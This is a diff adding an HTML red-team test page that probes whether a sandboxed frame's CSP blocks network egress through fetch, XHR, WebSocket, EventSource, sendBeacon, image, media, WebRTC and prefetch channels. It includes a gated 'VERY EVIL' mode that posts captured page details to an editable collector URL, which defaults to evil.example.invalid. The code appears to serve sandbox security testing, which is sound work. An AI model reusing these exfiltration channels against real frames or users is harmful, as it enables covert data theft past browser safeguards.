@@ -1,0 +1,842 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>evil-02 CSP & network egress</title>
+<meta name="description" content="Red-team napplet: NIP-5D CSP baseline egress probes — every network primitive, plus WebRTC, which no CSP directive covers.">
+<meta name="napplet-id" content="evil-02-csp-egress">
+<!--
+  evil-napplets ROE (see repo README):
+  - demo mode: probe + masked evidence only. no writes outside this frame
+    (one immediately-cleaned marker key proves storage, nothing else),
+    no network, no signing, no navigation, no persistence.
+  - VERY EVIL mode: in-napplet arming + stern confirmation that describes
+    every armed payload exactly + typed EXECUTE EVIL, then real execution.
+  - default collector is https://evil.example.invalid/collect (RFC 2606,
+    non-resolving): even in VERY EVIL mode nothing leaves the machine.
+-->
+<style>
+  :root {
+    --bg: #120f16;
+    --fg: #e9e6f2;
+    --primary: #ff5470;
+    --ok: #3fd68f;
+    --warn: #ffb454;
+    --muted: #8d88a3;
+    --danger: #ff5470;
+    --surface: color-mix(in srgb, var(--bg) 88%, var(--fg));
+    --border: color-mix(in srgb, var(--fg) 16%, transparent);
+    --space-1: 4px;
+    --space-2: 8px;
+    --space-3: 12px;
+    --control-h: 28px;
+    --radius: 6px;
+    color-scheme: dark;
+    font: 12.5px/1.45 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+  }
+  html, body { height: 100%; margin: 0; }
+  #app {
+    container-type: inline-size;
+    height: 100%;
+    box-sizing: border-box;
+    display: flex;
+    flex-direction: column;
+    gap: var(--space-2);
+    padding: var(--space-2);
+    background: var(--bg);
+    color: var(--fg);
+    user-select: none;
+  }
+  .toolbar {
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    gap: var(--space-1);
+    min-height: var(--control-h);
+    flex: 0 0 auto;
+  }
+  .summary {
+    color: var(--muted);
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+  }
+  .summary b { color: var(--danger); }
+  .summary .ok-count { color: var(--ok); }
+  .summary .sent-count { color: var(--warn); }
+  .spacer { flex: 1; }
+  button {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    color: var(--fg);
+    cursor: pointer;
+    font: inherit;
+    height: var(--control-h);
+    padding: 0 10px;
+    white-space: nowrap;
+  }
+  button:hover:not(:disabled) { border-color: var(--primary); color: var(--primary); }
+  button:disabled { opacity: .45; cursor: default; }
+  button.arm { border-color: color-mix(in srgb, var(--danger) 60%, var(--border)); color: var(--danger); font-weight: 700; }
+  #rows {
+    flex: 1 1 auto;
+    min-height: 0;
+    overflow: auto;
+    display: grid;
+    grid-auto-rows: min-content;
+    gap: var(--space-1);
+    align-content: start;
+  }
+  @container (min-width: 760px) { #rows { grid-template-columns: 1fr 1fr; } }
+  @container (min-width: 1200px) { #rows { grid-template-columns: 1fr 1fr 1fr; } }
+  .attack {
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: var(--space-2);
+    display: grid;
+    gap: var(--space-1);
+    background: color-mix(in srgb, var(--surface) 30%, transparent);
+  }
+  .attack.armed, .attack.sent { border-color: color-mix(in srgb, var(--danger) 55%, var(--border)); }
+  .attack-head { display: flex; align-items: center; gap: var(--space-2); flex-wrap: wrap; }
+  .attack-name { font-weight: 700; }
+  .attack-target { color: var(--muted); font-size: 11px; }
+  .chip {
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    display: inline-flex;
+    align-items: center;
+    gap: 4px;
+    padding: 1px 6px;
+    font-size: 10px;
+    text-transform: uppercase;
+    letter-spacing: .04em;
+    white-space: nowrap;
+  }
+  .chip.status-armed { color: var(--danger); border-color: color-mix(in srgb, var(--danger) 55%, var(--border)); background: color-mix(in srgb, var(--danger) 12%, transparent); }
+  .chip.status-blocked { color: var(--ok); border-color: color-mix(in srgb, var(--ok) 45%, var(--border)); background: color-mix(in srgb, var(--ok) 10%, transparent); }
+  .chip.status-sent { color: var(--warn); border-color: color-mix(in srgb, var(--warn) 55%, var(--border)); background: color-mix(in srgb, var(--warn) 12%, transparent); }
+  .chip.status-na { color: var(--muted); }
+  .chip.sev-critical { color: var(--danger); }
+  .chip.sev-high { color: var(--warn); }
+  .chip.sev-info { color: var(--muted); }
+  .evidence {
+    color: var(--muted);
+    font-size: 11px;
+    user-select: text;
+    overflow-wrap: anywhere;
+  }
+  .row-actions { display: flex; gap: var(--space-1); }
+  .row-actions button { height: 22px; padding: 0 8px; font-size: 11px; }
+  #evilPanel {
+    border: 1px solid color-mix(in srgb, var(--danger) 55%, var(--border));
+    border-radius: var(--radius);
+    background: color-mix(in srgb, var(--danger) 8%, var(--surface));
+    padding: var(--space-2);
+    display: grid;
+    gap: var(--space-1);
+    max-height: 40%;
+    overflow: auto;
+    flex: 0 0 auto;
+  }
+  #evilPanel h2 { margin: 0; font-size: 11px; text-transform: uppercase; letter-spacing: .06em; color: var(--danger); }
+  .evil-log { font-size: 11px; white-space: pre-wrap; user-select: text; color: var(--fg); }
+  #reportBox { display: grid; gap: var(--space-1); flex: 0 0 auto; }
+  details#report, details#kit { border: 1px solid var(--border); border-radius: var(--radius); padding: var(--space-2); }
+  details#report summary, details#kit summary { cursor: pointer; color: var(--muted); }
+  #reportText {
+    box-sizing: border-box;
+    width: 100%;
+    min-height: 90px;
+    resize: vertical;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    color: var(--fg);
+    font: 11px/1.4 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    padding: var(--space-1);
+    user-select: text;
+  }
+  .kit-entry { margin-bottom: var(--space-2); }
+  .kit-entry .kit-label { color: var(--warn); font-size: 11px; }
+  .kit-entry .kit-note { color: var(--muted); font-size: 11px; margin: 2px 0; }
+  .kit-entry pre {
+    margin: 0;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: var(--space-1);
+    overflow: auto;
+    font: 10.5px/1.4 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    user-select: text;
+    max-height: 140px;
+  }
+  dialog {
+    background: var(--bg);
+    color: var(--fg);
+    border: 1px solid color-mix(in srgb, var(--danger) 55%, var(--border));
+    border-radius: 8px;
+    padding: var(--space-3);
+    max-width: min(640px, 92vw);
+    max-height: 86dvh;
+    overflow: auto;
+  }
+  dialog::backdrop { background: rgba(10, 6, 12, .8); }
+  dialog h2 { margin: 0 0 var(--space-2); color: var(--danger); font-size: 14px; text-transform: uppercase; letter-spacing: .08em; }
+  .stern { border: 1px solid var(--danger); border-radius: var(--radius); padding: var(--space-2); color: var(--danger); font-weight: 700; margin: 0 0 var(--space-2); }
+  .plan-list { margin: 0 0 var(--space-2); padding-left: 18px; }
+  .plan-list li { margin-bottom: var(--space-2); }
+  .plan-list b { color: var(--danger); }
+  label { display: block; color: var(--muted); font-size: 11px; margin-bottom: var(--space-1); }
+  input[type="text"], input[type="url"] {
+    box-sizing: border-box;
+    width: 100%;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    color: var(--fg);
+    font: inherit;
+    padding: 4px 8px;
+  }
+  dialog .confirm-row { display: flex; gap: var(--space-1); align-items: center; margin-top: var(--space-2); flex-wrap: wrap; }
+  #confirmBtn { border-color: var(--danger); color: var(--danger); font-weight: 700; }
+  #confirmBtn:not(:disabled):hover { background: var(--danger); color: var(--bg); }
+  .muted { color: var(--muted); font-size: 11px; }
+  @media (max-height: 240px) { .toolbar button .btn-label-long { display: none; } #reportBox { display: none; } }
+  @container (max-width: 300px) { .attack-target { display: none; } }
+</style>
+</head>
+<body>
+<div id="app">
+  <div class="toolbar">
+    <span id="summary" class="summary">probing…</span>
+    <span class="spacer"></span>
+    <button id="runAllBtn" type="button">run all</button>
+    <button id="reportBtn" type="button">report</button>
+    <button id="armBtn" class="arm" type="button">ARM VERY EVIL MODE</button>
+  </div>
+  <div id="rows"></div>
+  <div id="evilPanel" hidden>
+    <h2>VERY EVIL MODE — execution log</h2>
+    <div id="evilLog" class="evil-log"></div>
+  </div>
+  <div id="reportBox">
+    <details id="report">
+      <summary>report (JSON)</summary>
+      <textarea id="reportText" rows="6" spellcheck="false"></textarea>
+      <div class="row-actions" style="margin-top: 6px;">
+        <button id="copyReportBtn" type="button">copy report</button>
+      </div>
+    </details>
+  </div>
+</div>
+
+<dialog id="confirmDlg" aria-labelledby="confirmTitle">
+  <form method="dialog" style="display:grid; gap: 0;">
+    <h2 id="confirmTitle">⚠ VERY EVIL MODE — final confirmation</h2>
+    <p class="stern">THIS WILL ACTUALLY EXECUTE THE ATTACKS. NOT A DRILL.</p>
+    <p class="muted">Every armed attack below will run for real, in this order (destructive payloads last). Where payloads egress, data leaves this frame toward the collector URL. Only a hardened runtime will stop them.</p>
+    <ol id="planList" class="plan-list"></ol>
+    <label>collector / exfiltration destination (edit to point at your own)
+      <input id="collectorInput" type="url" spellcheck="false">
+    </label>
+    <label>type <b style="color: var(--danger);">EXECUTE EVIL</b> exactly, case-sensitive, to enable the button
+      <input id="confirmInput" type="text" autocomplete="off" spellcheck="false" placeholder="EXECUTE EVIL">
+    </label>
+    <div class="confirm-row">
+      <button id="confirmBtn" type="button" disabled>EXECUTE — DO EVIL</button>
+      <button value="cancel" type="submit" style="align-self: center;">cancel — stay demo</button>
+    </div>
+  </form>
+</dialog>
+
+<script>
+'use strict';
+(function () {
+  window.__EVIL_ID__ = 'evil-02-csp-egress';
+  const DEFAULT_COLLECTOR = 'https://evil.example.invalid/collect';
+  const CONFIRM_PHRASE = 'EXECUTE EVIL';
+  const state = {
+    results: {},     // id -> { status, evidence }
+    evilResults: {}, // id -> object evidence of the real execution
+    veryEvil: false,
+    collector: DEFAULT_COLLECTOR,
+  };
+
+  const app = document.getElementById('app');
+  const rowsEl = document.getElementById('rows');
+  const summaryEl = document.getElementById('summary');
+  const evilPanel = document.getElementById('evilPanel');
+  const evilLog = document.getElementById('evilLog');
+  const armBtn = document.getElementById('armBtn');
+  const confirmDlg = document.getElementById('confirmDlg');
+  const confirmInput = document.getElementById('confirmInput');
+  const confirmBtn = document.getElementById('confirmBtn');
+  const collectorInput = document.getElementById('collectorInput');
+  const planList = document.getElementById('planList');
+  const reportText = document.getElementById('reportText');
+
+  /* ---------- shared helpers ---------- */
+
+  function errMsg(e) {
+    if (!e) return String(e);
+    if (typeof e === 'string') return e;
+    return (e.name ? e.name + ': ' : '') + (e.message || String(e));
+  }
+  function mask(v, keep) {
+    keep = keep || 6;
+    const s = String(v);
+    if (s.length <= keep) return s.slice(0, 1) + '…';
+    return s.slice(0, keep) + '… (' + s.length + ' chars, masked)';
+  }
+  function randId() {
+    try { return crypto.randomUUID().slice(0, 8); }
+    catch (_) { return Math.random().toString(16).slice(2, 10); }
+  }
+  function withTimeout(promise, ms) {
+    ms = ms || 2000;
+    return new Promise((resolve) => {
+      const t = setTimeout(() => resolve('timeout'), ms);
+      Promise.resolve(promise).then(
+        (v) => { clearTimeout(t); resolve(v); },
+        (e) => { clearTimeout(t); resolve({ __rejected: errMsg(e) }); }
+      );
+    });
+  }
+  function blocked(evidence) { return { status: 'blocked', evidence: evidence }; }
+  function armed(evidence) { return { status: 'armed', evidence: evidence }; }
+  function na(evidence) { return { status: 'na', evidence: evidence }; }
+  function sent(evidence) { return { status: 'sent', evidence: evidence }; }
+  function safeGet(fn) {
+    try { return fn(); } catch (e) { return 'denied: ' + errMsg(e); }
+  }
+  function findNostr() {
+    if (window.nostr) return window.nostr;
+    try { if (window.parent && window.parent.nostr) return window.parent.nostr; } catch (_) { /* cross-origin: held */ }
+    return null;
+  }
+  function captureSummary() {
+    return JSON.stringify({
+      origin: safeGet(() => window.origin),
+      href: safeGet(() => location.href),
+      referrer: document.referrer,
+      parentLength: safeGet(() => window.parent.length),
+      at: new Date().toISOString(),
+    });
+  }
+  async function sendToCollector(kind, data) {
+    const url = state.collector;
+    const body = JSON.stringify({ kind: kind, at: new Date().toISOString(), data: data });
+    try {
+      const r = await withTimeout(fetch(url, { method: 'POST', mode: 'no-cors', body: body }), 4000);
+      if (r === 'timeout') return 'fetch timed out';
+      if (r && r.__rejected) return 'network egress failed: ' + r.__rejected;
+      return 'request dispatched to collector (opaque response) — egress channel OPEN';
+    } catch (e) {
+      return 'network egress failed: ' + errMsg(e) + ' — runtime/CSP held';
+    }
+  }
+  function postParent(msg) { window.parent.postMessage(msg, '*'); }
+  function waitForMsg(id, ms) {
+    ms = ms || 2000;
+    return new Promise((resolve) => {
+      let done = false;
+      const on = (e) => {
+        if (e.data && e.data.id === id) {
+          cleanup(); resolve(e.data);
+        }
+      };
+      function cleanup() { window.removeEventListener('message', on); }
+      window.addEventListener('message', on);
+      setTimeout(() => { if (!done) { done = true; cleanup(); resolve('timeout'); } }, ms);
+    });
+  }
+  function pingOnce() {
+    return new Promise((resolve) => {
+      const id = 'evil-ping-' + randId();
+      const t = performance.now();
+      const sentWall = Date.now();
+      const on = (e) => {
+        const d = e.data;
+        if (d && d.type === 'evil.pong' && d.id === id) {
+          window.removeEventListener('message', on);
+          resolve({
+            rtt: performance.now() - t,
+            // wall-clock (shared epoch) so shell-side starvation is measurable
+            shellDelay: typeof d.shellEchoedAt === 'number' ? d.shellEchoedAt - sentWall : null,
+          });
+        }
+      };
+      window.addEventListener('message', on);
+      window.parent.postMessage({ type: 'evil.ping', id: id, sentWall: sentWall }, '*');
+      setTimeout(() => { window.removeEventListener('message', on); resolve(null); }, 5000);
+    });
+  }
+  async function pingRTT(samples) {
+    samples = samples || 5;
+    const out = [];
+    for (let i = 0; i < samples; i++) {
+      const p = await pingOnce();
+      if (p && p.rtt >= 0) out.push(p.rtt);
+    }
+    return out.sort((a, b) => a - b);
+  }
+
+  // evil-02 — CSP & network egress (tier 0, bridges into tier 3 via WebRTC).
+// A srcdoc frame has no HTTP response to carry a CSP header; connect-src 'none'
+// is all that stands between an opaque-origin frame and the network. Probes
+// every egress primitive; the finding is the one NO directive covers: WebRTC.
+const NX = 'https://evil.example.invalid/collect';
+
+function egressProbe(label, fire) {
+  return new Promise((resolve) => {
+    let violation = null;
+    let settled = false;
+    const onV = (e) => { violation = e; finish(); };
+    function finish() {
+      if (settled) return;
+      settled = true;
+      document.removeEventListener('securitypolicyviolation', onV);
+      resolve(violation
+        ? blocked(label + ' blocked by CSP ' + (violation.effectiveDirective || violation.violatedDirective) + ' — ' + label + ' egress closed')
+        : armed(label + ' channel OPEN — no CSP violation observed (request left the frame; NX collector fails by design)'));
+    }
+    document.addEventListener('securitypolicyviolation', onV);
+    setTimeout(() => finish(), 1400);
+    try {
+      fire();
+    } catch (e) {
+      settled = true;
+      document.removeEventListener('securitypolicyviolation', onV);
+      resolve(blocked(label + ' threw synchronously: ' + errMsg(e) + ' — egress closed'));
+    }
+  });
+}
+
+const ATTACKS = [
+  {
+    id: 'eval-csp',
+    name: 'CSP enforcement canary',
+    target: 'script-src \'unsafe-inline\' \'wasm-unsafe-eval\' — never unsafe-eval',
+    severity: 'high',
+    harm: 'Without CSP enforcement in this frame, every egress primitive below is open and script compilation is unrestricted.',
+    async demo() {
+      try {
+        const v = eval('({ evil: 2 })');
+        return v && v.evil === 2
+          ? armed('eval() works — NO CSP enforcement in this frame: every egress channel below is open')
+          : blocked('eval returned an unexpected value');
+      } catch (e) {
+        return blocked('eval blocked (' + errMsg(e) + ') — CSP script-src enforced, wasm-only compilation');
+      }
+    },
+  },
+  {
+    id: 'fetch',
+    name: 'fetch egress',
+    target: "connect-src 'none'",
+    severity: 'critical',
+    harm: 'Full outbound HTTP with request bodies — exfiltration of everything this frame sees.',
+    evilBrief: 'POSTs a captured summary to the collector via fetch() — real network egress with a JSON body.',
+    demo: () => egressProbe('fetch', () => { void fetch(NX, { method: 'POST', mode: 'no-cors', body: 'evil-02-fetch' }); }),
+    async evil() {
+      const out = {};
+      try {
+        const r = await withTimeout(fetch(state.collector, { method: 'POST', mode: 'no-cors', body: JSON.stringify({ kind: 'evil02-fetch', data: captureSummary() }) }), 5000);
+        out.result = r === 'timeout' ? 'fetch pending' : 'fetch dispatched (opaque) — egress OPEN';
+      } catch (e) { out.result = 'denied: ' + errMsg(e); }
+      return out;
+    },
+  },
+  {
+    id: 'xhr',
+    name: 'XMLHttpRequest egress',
+    target: "connect-src 'none'",
+    severity: 'critical',
+    harm: 'Legacy egress channel — same reach as fetch.',
+    evilBrief: 'POSTs the captured summary to the collector via XHR — real network egress.',
+    demo: () => egressProbe('XHR', () => {
+      const xhr = new XMLHttpRequest();
+      xhr.open('POST', NX);
+      xhr.send('evil-02-xhr');
+    }),
+    async evil() {
+      const out = {};
+      try {
+        out.result = await new Promise((resolve) => {
+          const xhr = new XMLHttpRequest();
+          xhr.open('POST', state.collector);
+          xhr.timeout = 4000;
+          xhr.onload = () => resolve('XHR dispatched, status ' + xhr.status);
+          xhr.onerror = () => resolve('XHR network error (request still left the frame if not CSP-blocked)');
+          xhr.ontimeout = () => resolve('XHR timed out (request left the frame)');
+          xhr.send(JSON.stringify({ kind: 'evil02-xhr', data: captureSummary() }));
+          setTimeout(() => resolve('XHR pending'), 4500);
+        });
+      } catch (e) { out.result = 'denied: ' + errMsg(e); }
+      return out;
+    },
+  },
+  {
+    id: 'websocket',
+    name: 'WebSocket egress',
+    target: "connect-src 'none'",
+    severity: 'critical',
+    harm: 'Persistent bidirectional channel — interactive exfiltration and remote-control transport.',
+    evilBrief: 'Opens a WebSocket to wss://evil.example.invalid/collect and sends the captured summary — a real persistent channel (non-resolving host: it will fail at DNS, but the open attempt is real).',
+    demo: () => egressProbe('WebSocket', () => { const ws = new WebSocket('wss://evil.example.invalid/ws'); ws.onopen = () => ws.close(); }),
+    async evil() {
+      const out = {};
+      try {
+        out.result = await new Promise((resolve) => {
+          const ws = new WebSocket(state.collector.replace(/^https/, 'wss').replace(/collect$/, 'ws'));
+          const t = setTimeout(() => { try { ws.close(); } catch (_) {} resolve('WS pending/failing (DNS for NX host fails by design — the channel open was real)'); }, 5000);
+          ws.onopen = () => { clearTimeout(t); ws.send(JSON.stringify({ kind: 'evil02-ws', data: captureSummary() })); ws.close(); resolve('WS OPEN — data sent over a live socket'); };
+          ws.onerror = () => { clearTimeout(t); resolve('WS error after real open attempt (NX host by design) — channel exists, delivery failed at DNS'); };
+        });
+      } catch (e) { out.result = 'denied: ' + errMsg(e); }
+      return out;
+    },
+  },
+  {
+    id: 'eventsource',
+    name: 'EventSource egress',
+    target: "connect-src 'none'",
+    severity: 'high',
+    harm: 'Server-sent events channel — inbound-only exfil ack / C2 feed.',
+    evilBrief: 'Attempts an EventSource connection to the collector — real channel open attempt.',
+    demo: () => egressProbe('EventSource', () => { const es = new EventSource(NX); es.onopen = () => es.close(); es.onerror = () => es.close(); }),
+    async evil() {
+      return { result: 'EventSource open attempted at ' + state.collector + ' (streams events if the host resolves for you)' };
+    },
+  },
+  {
+    id: 'beacon',
+    name: 'sendBeacon egress',
+    target: "connect-src 'none'",
+    severity: 'high',
+    harm: 'Fire-and-forget POST that survives page unload — exfil with no trace in JS.',
+    evilBrief: 'Queues a real beacon POST of the captured summary to the collector — fire-and-forget egress.',
+    demo: () => egressProbe('sendBeacon', () => { try { navigator.sendBeacon(NX, 'evil-02-beacon'); } catch (_) {} }),
+    async evil() {
+      const out = {};
+      try {
+        out.queued = navigator.sendBeacon(state.collector, JSON.stringify({ kind: 'evil02-beacon', data: captureSummary() }));
+        out.result = out.queued ? 'beacon QUEUED — egress OPEN' : 'beacon refused';
+      } catch (e) { out.result = 'denied: ' + errMsg(e); }
+      return out;
+    },
+  },
+  {
+    id: 'img-beacon',
+    name: 'img beacon egress',
+    target: "img-src data: blob:",
+    severity: 'high',
+    harm: 'GET egress through image loads — data in the query string, invisible to fetch-based logging.',
+    evilBrief: 'Fires a real img GET to collector?ev=img-exfil&payload=<summary> — egress through resource loads.',
+    demo: () => egressProbe('img', () => {
+      const img = document.createElement('img');
+      img.style.cssText = 'position:fixed;left:-9999px;width:1px;height:1px';
+      img.onload = img.onerror = () => img.remove();
+      img.src = NX + '?ev=probe&d=1';
+      document.body.appendChild(img);
+    }),
+    async evil() {
+      const img = document.createElement('img');
+      img.src = state.collector + '?ev=img-exfil&payload=' + encodeURIComponent(captureSummary());
+      img.onload = img.onerror = () => img.remove();
+      document.body.appendChild(img);
+      return { result: 'img exfil GET dispatched to ' + state.collector };
+    },
+  },
+  {
+    id: 'media-beacon',
+    name: 'media beacon egress',
+    target: "media-src 'none'",
+    severity: 'medium',
+    harm: 'Audio/video element loads as an egress primitive.',
+    evilBrief: 'Attempts an audio load from the collector — media GET egress.',
+    demo: () => egressProbe('audio', () => {
+      const a = document.createElement('audio');
+      a.src = NX + '.mp3';
+      a.oncanplay = a.onerror = () => a.remove();
+      document.body.appendChild(a);
+    }),
+    async evil() {
+      const a = document.createElement('audio');
+      a.src = state.collector + '?ev=media-exfil';
+      a.oncanplay = a.onerror = () => a.remove();
+      document.body.appendChild(a);
+      return { result: 'media exfil load attempted' };
+    },
+  },
+  {
+    id: 'webrtc',
+    name: 'WebRTC data channel — no CSP directive',
+    target: 'NIP-5D CSP advisory covers no WebRTC directive',
+    severity: 'critical',
+    harm: 'RTCPeerConnection is not governed by any CSP fetch directive (connect-src does not apply). Under NIP-5D\'s OWN conservative baseline a napplet can open data channels to attacker peers. Data-channel egress with no CSP recourse.',
+    evilBrief: 'Constructs a real RTCPeerConnection with a public STUN server, opens a data channel, and gathers ICE candidates — a working egress/transport primitive the spec\'s baseline does not block. Data delivery to the attacker requires an attacker peer (signaling out-of-band), which this demonstrates the availability of.',
+    async demo() {
+      if (typeof RTCPeerConnection !== 'function') return blocked('RTCPeerConnection unavailable — WebRTC egress closed at the platform level');
+      try {
+        const pc = new RTCPeerConnection({ iceServers: [] });
+        const dc = pc.createDataChannel('evil02-probe');
+        try { pc.close(); } catch (_) {}
+        return armed('RTCPeerConnection + createDataChannel(' + (dc && dc.label) + ') SUCCEEDED with no CSP violation — WebRTC egress is OPEN under the spec\'s own baseline (iceServers omitted in demo: no network)');
+      } catch (e) {
+        return blocked('RTCPeerConnection construction failed: ' + errMsg(e));
+      }
+    },
+    async evil() {
+      const out = {};
+      try {
+        const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+        const dc = pc.createDataChannel('evil02-exfil');
+        out.dataChannel = 'opened (' + dc.label + ')';
+        const candidates = [];
+        await new Promise((resolve) => {
+          const t = setTimeout(resolve, 4000);
+          pc.onicecandidate = (e) => {
+            if (e.candidate) { candidates.push(e.candidate.candidate.split(' ')[4]); if (candidates.length >= 2) { clearTimeout(t); resolve(); } }
+          };
+          pc.createOffer().then((o) => pc.setLocalDescription(o)).catch(() => { clearTimeout(t); resolve(); });
+        });
+        out.iceCandidates = candidates.length + ' gathered (' + candidates.slice(0, 2).join(', ') + ')';
+        out.note = 'data channel + ICE ready — signaling to an attacker peer delivers everything this frame sees';
+        try { dc.close(); pc.close(); } catch (_) {}
+      } catch (e) { out.error = errMsg(e); }
+      return out;
+    },
+  },
+  {
+    id: 'prefetch-hint',
+    name: 'prefetch / dns-prefetch hints',
+    target: 'no CSP directive governs prefetch',
+    severity: 'low',
+    harm: 'Prefetch and dns-prefetch hint loads are not observable as fetches and not covered by connect-src — a covert egress/traffic-shaping channel.',
+    async demo() {
+      const inserted = [];
+      const before = { ok: true };
+      for (const rel of ['prefetch', 'dns-prefetch']) {
+        const link = document.createElement('link');
+        link.rel = rel;
+        link.href = NX + '?ev=' + rel;
+        document.head.appendChild(link);
+        inserted.push(rel);
+        setTimeout(() => link.remove(), 1000);
+      }
+      return na('inserted ' + inserted.join(', ') + ' hint links — success is NOT verifiable from inside the frame (no violation event, no load event). CSP does not govern prefetch: treat the channel as open unless your platform blocks hints (Permissions-Policy / browser flags)');
+    },
+    async evil() {
+      const link = document.createElement('link');
+      link.rel = 'prefetch';
+      link.href = state.collector + '?ev=prefetch-exfil&payload=' + encodeURIComponent(captureSummary().slice(0, 512));
+      document.head.appendChild(link);
+      return { result: 'prefetch hint exfil dispatched to ' + state.collector };
+    },
+  },
+];
+
+
+  /* ---------- rendering ---------- */
+
+  function sevChip(sev) {
+    const s = sev === 'critical' ? 'sev-critical' : sev === 'high' ? 'sev-high' : 'sev-info';
+    return '<span class="chip ' + s + '">' + sev + '</span>';
+  }
+  function statusChip(st) {
+    const label = st === 'armed' ? 'ARMED' : st === 'blocked' ? 'HELD' : st === 'sent' ? 'SENT' : st === 'na' ? 'N/A' : st || '—';
+    return '<span class="chip status-' + (st || 'na') + '">' + label + '</span>';
+  }
+  function esc(s) {
+    return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/"/g, '&quot;');
+  }
+  function renderRows() {
+    rowsEl.innerHTML = '';
+    for (const a of ATTACKS) {
+      const r = state.results[a.id] || {};
+      const div = document.createElement('div');
+      div.className = 'attack' + (r.status === 'armed' || r.status === 'sent' ? ' ' + r.status : '');
+      div.dataset.attack = a.id;
+      div.dataset.status = r.status || 'pending';
+      div.innerHTML =
+        '<div class="attack-head">' +
+          statusChip(r.status) +
+          '<span class="attack-name">' + esc(a.name) + '</span>' +
+          sevChip(a.severity) +
+          '<span class="spacer"></span>' +
+          '<div class="row-actions"><button data-probe="' + a.id + '" type="button">probe</button></div>' +
+        '</div>' +
+        '<div class="attack-target">' + esc(a.target) + '</div>' +
+        '<div class="evidence">' + esc(r.evidence || 'not probed') + '</div>';
+      rowsEl.appendChild(div);
+    }
+    rowsEl.querySelectorAll('button[data-probe]').forEach((b) => {
+      b.addEventListener('click', () => runDemo(b.dataset.probe));
+    });
+  }
+  function renderSummary() {
+    const counts = { armed: 0, blocked: 0, na: 0, sent: 0 };
+    for (const a of ATTACKS) {
+      const s = (state.results[a.id] || {}).status;
+      if (counts[s] != null) counts[s]++;
+    }
+    summaryEl.innerHTML = state.veryEvil
+      ? '<b>VERY EVIL MODE ACTIVE</b> · payloads executed'
+      : 'demo mode · <b>' + counts.armed + ' armed</b> / <span class="ok-count">' + counts.blocked + ' held</span> / <span class="sent-count">' + counts.sent + ' sent</span> / ' + counts.na + ' n/a';
+    const armable = counts.armed + counts.sent;
+    armBtn.disabled = armable === 0;
+    armBtn.title = armable === 0 ? 'nothing armed — runtime held every probe' : armable + ' attack(s) armable';
+  }
+  function renderKit() {
+    const kit = window.__EVIL_KIT__;
+    if (!kit || !kit.length) return;
+    const d = document.createElement('details');
+    d.id = 'kit';
+    d.innerHTML = '<summary>attack kit — crafted inputs (copy)</summary>';
+    for (const entry of kit) {
+      const div = document.createElement('div');
+      div.className = 'kit-entry';
+      div.innerHTML =
+        '<div class="kit-label">' + esc(entry.label) + '</div>' +
+        (entry.note ? '<div class="kit-note">' + esc(entry.note) + '</div>' : '') +
+        '<pre>' + esc(typeof entry.data === 'string' ? entry.data : JSON.stringify(entry.data, null, 2)) + '</pre>' +
+        '<div class="row-actions"><button type="button">copy</button></div>';
+      div.querySelector('button').addEventListener('click', () => {
+        const text = typeof entry.data === 'string' ? entry.data : JSON.stringify(entry.data, null, 2);
+        try { void navigator.clipboard.writeText(text); } catch (_) { /* clipboard denied */ }
+      });
+      d.appendChild(div);
+    }
+    document.getElementById('reportBox').before(d);
+  }
+  function render() { renderRows(); renderSummary(); }
+
+  async function runDemo(id) {
+    const a = ATTACKS.find((x) => x.id === id);
+    if (!a) return;
+    state.results[id] = { status: 'pending', evidence: 'probing…' };
+    render();
+    try {
+      state.results[id] = await a.demo();
+    } catch (e) {
+      state.results[id] = { status: 'na', evidence: 'probe error: ' + errMsg(e) };
+    }
+    render();
+    updateReport();
+  }
+  async function runAllDemos() {
+    for (const a of ATTACKS) await runDemo(a.id);
+  }
+
+  /* ---------- VERY EVIL ---------- */
+
+  function planOrder() {
+    const plain = ATTACKS.filter((a) => a.evil && !a.destructive);
+    const last = ATTACKS.filter((a) => a.evil && a.destructive);
+    return plain.concat(last);
+  }
+  function openConfirm() {
+    const armable = planOrder().filter((a) => {
+      const s = (state.results[a.id] || {}).status;
+      return s === 'armed' || s === 'sent';
+    });
+    if (!armable.length) return;
+    planList.innerHTML = '';
+    for (const a of armable) {
+      const li = document.createElement('li');
+      li.innerHTML = '<b>' + esc(a.name) + '</b> — ' + esc(a.evilBrief || a.harm);
+      planList.appendChild(li);
+    }
+    collectorInput.value = state.collector;
+    confirmInput.value = '';
+    confirmBtn.disabled = true;
+    confirmDlg.showModal();
+  }
+  collectorInput.addEventListener('input', () => { state.collector = collectorInput.value.trim() || DEFAULT_COLLECTOR; });
+  confirmInput.addEventListener('input', () => { confirmBtn.disabled = confirmInput.value !== CONFIRM_PHRASE; });
+
+  confirmBtn.addEventListener('click', async () => {
+    confirmDlg.close();
+    await executeVeryEvil();
+  });
+
+  async function executeVeryEvil() {
+    state.veryEvil = true;
+    evilPanel.hidden = false;
+    evilLog.textContent = '';
+    const logLine = (s) => {
+      evilLog.textContent += '[' + new Date().toISOString() + '] ' + s + '\n';
+      evilLog.scrollTop = evilLog.scrollHeight;
+    };
+    logLine('VERY EVIL MODE — executing armed payloads against ' + safeGet(() => location.href));
+    logLine('collector: ' + state.collector);
+    renderSummary();
+    for (const a of planOrder()) {
+      const st = (state.results[a.id] || {}).status;
+      if (st !== 'armed' && st !== 'sent') {
+        state.evilResults[a.id] = { skipped: 'not armed (' + (st || 'unprobed') + ') — runtime holds' };
+        logLine('SKIP ' + a.name + ' — not armable, the runtime holds');
+        updateReport();
+        continue;
+      }
+      logLine('RUN  ' + a.name + ' — ' + (a.evilBrief || a.harm));
+      try {
+        state.evilResults[a.id] = await a.evil();
+        logLine('DONE ' + a.name + ' → ' + JSON.stringify(state.evilResults[a.id]).slice(0, 400));
+      } catch (e) {
